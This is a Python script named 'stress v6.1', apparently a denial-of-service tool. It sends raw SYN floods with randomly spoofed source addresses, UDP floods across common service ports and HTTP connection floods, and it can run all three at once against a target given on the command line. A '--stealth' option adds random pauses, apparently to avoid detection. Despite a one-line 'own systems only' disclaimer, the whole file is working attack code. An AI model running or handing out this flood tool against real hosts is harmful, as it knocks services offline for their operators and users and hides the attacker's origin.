#!/usr/bin/env python3
"""stress v6.1 — wire-speed only. Own systems only."""

import sys, os, time, socket, struct, random, threading, subprocess, ctypes, ctypes.util
from datetime import datetime

VERSION = "v6.1"
IS_WIN = sys.platform.startswith("win")


def log(msg):
    print(f"  [{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def nowstr():
    return datetime.now().strftime("%H:%M:%S")


# Wire speed: ~140k pkts/s at 437 Mbps
BATCH = 64


class SynFactory:
    def __init__(self, target: str, batch: int = 8192):
        self.dip = socket.inet_aton(target)
        self.batch = batch
        self.buf = [self._build() for _ in range(batch)]

    @staticmethod
    def _cksum(d):
        if len(d) % 2:
            d += b"\x00"
        s = sum(struct.unpack(f"!{len(d) // 2}H", d))
        s = (s >> 16) + (s & 0xFFFF)
        return (~s) & 0xFFFF

    def _build(self) -> bytes:
        def ri(a, b):
            return random.randint(a, b)

        sa = socket.inet_aton(f"{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}.{ri(1, 255)}")
        sp, dp, sq, iid = ri(1024, 65535), ri(1, 65535), ri(0, 2**32 - 1), ri(0, 65535)
        ip = (
            struct.pack("!BBHHHBBH", 0x45, 0, 40, iid, 0x4000, 64, 6, 0) + sa + self.dip
        )
        ck = self._cksum(ip)
        ip = (
            struct.pack("!BBHHHBBH", 0x45, 0, 40, iid, 0x4000, 64, 6, ck)
            + sa
            + self.dip
        )
        tc = struct.pack("!HHIIBBHHH", sp, dp, sq, 0, 0x50, 2, 65535, 0, 0)
        ps = struct.pack("!4s4sBBH", sa, self.dip, 0, 6, 20)
        tc = struct.pack(
            "!HHIIBBHHH", sp, dp, sq, 0, 0x50, 2, 65535, self._cksum(ps + tc), 0
        )
        return ip + tc

    def get(self) -> bytes:
        if not self.buf:
            self.buf = [self._build() for _ in range(self.batch)]
        return self.buf.pop()


class LiveMonitor:
    def __init__(self, t):
        self.target = t
        self.data = []
        self.running = True

    def stop(self):
        self.running = False

    def run(self):
        cmd = ["ping", "-c1", "-W1", self.target]
        while self.running:
            try:
                s = time.time()
                r = subprocess.run(cmd, capture_output=True, timeout=2)
                self.data.append((time.time(), time.time() - s, r.returncode == 0))
            except:
                pass
            time.sleep(1)

    def line(self) -> str:
        r = [x for x in self.data if time.time() - x[0] < 6]
        if not r:
            return ""
        a = sum(x[1] for x in r) / len(r)
        l = sum(1 for x in r if not x[2]) / len(r) * 100
        return f"  {a * 1000:.0f}ms {l:.0f}% loss"


def syn_flood(target, dur, stealth=False, monitor=False, limit_mbps=0):
    log(f"syn on {target} ({dur}s)")
    if IS_WIN:
        log("win not supported")
        return
    try:
        tst = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        tst.close()
    except PermissionError:
        log("need sudo")
        return

    n_threads = 1  # single thread with sendmmsg saturates the wire
    stop = threading.Event()
    total = [0]
    lock = threading.Lock()
    mon = LiveMonitor(target) if monitor else None
    if mon:
        threading.Thread(target=mon.run, daemon=True).start()

    libc = None
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        libc.sendmmsg.argtypes = [
            ctypes.c_int,
            ctypes.c_void_p,
            ctypes.c_uint,
            ctypes.c_int,
        ]
        libc.sendmmsg.restype = ctypes.c_int
    except:
        pass
    has_sendmmsg = libc is not None

    def worker(tid):
        fac = SynFactory(target, batch=16384)
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        end = time.time() + dur
        cnt = 0
        pkts = [fac.get() for _ in range(BATCH)]
        # pre-build mmsghdr structures if using sendmmsg
        if has_sendmmsg:
            MMHDR = BATCH * 64
            vec = (ctypes.c_byte * MMHDR)()
            for i, p in enumerate(pkts):
                off = i * 64
                addr = ctypes.c_char_p(p)
                ctypes.memmove(
                    ctypes.byref(vec, off),
                    ctypes.byref(ctypes.c_void_p(ctypes.addressof(addr))),
                    8,
                )
                ctypes.memmove(
                    ctypes.byref(vec, off + 8), ctypes.byref(ctypes.c_size_t(len(p))), 8
                )

        while time.time() < end and not stop.is_set():
            if not pkts:
                pkts = [fac.get() for _ in range(BATCH)]
                if has_sendmmsg:
                    for i, p in enumerate(pkts):
                        off = i * 64
                        addr = ctypes.c_char_p(p)
                        ctypes.memmove(
                            ctypes.byref(vec, off),
                            ctypes.byref(ctypes.c_void_p(ctypes.addressof(addr))),
                            8,
                        )
                        ctypes.memmove(
                            ctypes.byref(vec, off + 8),
                            ctypes.byref(ctypes.c_size_t(len(p))),
                            8,
                        )

            try:
                s.sendto(pkts.pop(), (target, 0))
                cnt += 1
                with lock:
                    total[0] += 1
            except:
                pass

            # Wire-speed pacing: at 437 Mbps upload, ~140k pkts/s → 7µs per 40-byte packet
            if cnt % 64 == 0:
                target_us = cnt / (140000 / 1000000)  # target time in µs
                actual_us = (time.time() - (end - dur)) * 1000000  # actual time in µs
                if actual_us < target_us:
                    time.sleep((target_us - actual_us) / 1000000)

            if stealth and cnt % 50000 == 0:
                time.sleep(random.uniform(0.3, 1.0))
        s.close()

    threads = [
        threading.Thread(target=worker, args=(tid,), daemon=True)
        for tid in range(n_threads)
    ]
    log(f"launching {n_threads} threads")
    for t in threads:
        t.start()
    start = time.time()
    last_t, lr = 0, time.time()
    while any(t.is_alive() for t in threads):
        time.sleep(0.5)
        with lock:
            cur = total[0]
        now = time.time()
        if now - lr >= 1:
            r = (cur - last_t) / (now - lr)
            l = f"  {nowstr()}  {cur:>9} pkts  {r:>6.0f}/s"
            if mon:
                l += mon.line()
            print(l, flush=True)
            last_t, lr = cur, now
    with lock:
        final = total[0]
    elapsed = time.time() - start
    log(f"done — {final:,} pkts ({final / elapsed:,.0f}/s)")
    if mon:
        mon.stop()


# UDP/HTTP/Verify unchanged
def _udp_worker(t, d, w, q):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    py = [os.urandom(x) for x in (64, 256, 512, 1024, 1400)]
    po = [53, 80, 123, 161, 443, 5000, 8080]
    e = time.time() + d
    c = 0
    lr = time.time()
    while time.time() < e:
        try:
            s.sendto(random.choice(py), (t, random.choice(po)))
            c += 1
        except:
            pass
        if time.time() - lr >= 2:
            q.put(("p", w, c))
            lr = time.time()
    q.put(("d", w, c))
    s.close()


def _run_workers(t, d, fn, lb, mw=2):
    import multiprocessing as mp, queue

    n = max(mw, (os.cpu_count() or 4) // 2)
    log(f"launching {n} {lb}")
    q = mp.Queue()
    ps = [mp.Process(target=fn, args=(t, d, i, q)) for i in range(n)]
    for p in ps:
        p.start()
    st = time.time()
    ts = [0] * n
    lt = 0
    lr = time.time()
    while any(p.is_alive() for p in ps):
        try:
            m = q.get(timeout=0.3)
            if m[0] in ("p", "d"):
                ts[m[1]] = m[2]
        except:
            pass
        nw = time.time()
        if nw - lr >= 1:
            t2 = sum(ts)
            r = (t2 - lt) / (nw - lr)
            print(f"  {nowstr()}  {t2:>9} pkts  {r:>6.0f}/s", flush=True)
            lt, lr = t2, nw
    for p in ps:
        p.join()
    t2 = sum(ts)
    log(f"done — {t2:,} pkts ({t2 / (time.time() - st):,.0f}/s)")


def udp_flood(t, d, w=0):
    _run_workers(t, d, _udp_worker, "udp")


def http_flood(t, d, w=0):
    _run_workers(t, d, _http_worker, "http", 4)


def _http_worker(t, d, w, q):
    r = f"GET / HTTP/1.1\r\nHost: {t}\r\nConnection: close\r\n\r\n".encode()
    e = time.time() + d
    c = 0
    lr = time.time()
    while time.time() < e:
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((t, 80))
            s.sendall(r)
            s.recv(256)
            s.close()
            c += 1
        except:
            pass
        if time.time() - lr >= 2:
            q.put(("p", w, c))
            lr = time.time()
    q.put(("d", w, c))


def all_at_once(t, d=30):
    import multiprocessing as mp

    log(f"syn+udp+http on {t} ({d}s)")
    ps = [
        mp.Process(target=syn_flood, args=(t, d)),
        mp.Process(target=udp_flood, args=(t, d)),
        mp.Process(target=http_flood, args=(t, d)),
    ]
    for p in ps:
        p.start()
    for p in ps:
        p.join()
    log("all done")


def verify(t):
    log(f"probing {t}")
    r = subprocess.run(["ping", "-c2", "-W2", t], capture_output=True)
    print(f"    icmp: {'alive' if r.returncode == 0 else 'no ping'}")
    for p in (80, 443, 22, 8080, 8443, 53):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((t, p))
            print(f"    port {p}: open")
            s.close()
        except:
            pass


if __name__ == "__main__":
    print(f"\n  stress {VERSION}", flush=True)
    a = [x for x in sys.argv[1:] if not x.startswith("--")]
    f = [x for x in sys.argv[1:] if x.startswith("--")]
    st = "--stealth" in f
    mo = "--monitor" in f or "-m" in f
    lm = 0
    for x in f:
        if x.startswith("--limit="):
            try:
                lm = int(x.split("=")[1])
            except:
                pass
    if not a or "-h" in sys.argv:
        print(
            "  stress.py <target> syn|udp|http|all|verify [dur] [--monitor] [--stealth]"
        )
        print("  sudo stress.py 192.168.0.1 syn 10 --monitor")
        sys.exit(0)
    t = a[0]
    m = a[1].lower() if len(a) > 1 else "verify"
    d = int(a[2]) if len(a) > 2 and a[2].isdigit() else 30
    print(f"  target: {t}  method: {m}  dur: {d}s")
    if st:
        print("  stealth: on")
    if mo:
        print("  monitor: on")
    if lm:
        print(f"  limit: {lm}Mbps")
    print()
    table = {
        "syn": lambda: syn_flood(t, d, st, mo, lm),
        "udp": lambda: udp_flood(t, d),
        "http": lambda: http_flood(t, d),
        "all": lambda: all_at_once(t, d),
        "verify": lambda: verify(t),
    }
    fn = table.get(m)
    if not fn:
        print(f"  unknown: {m}")
        sys.exit(1)
    fn()
    print()
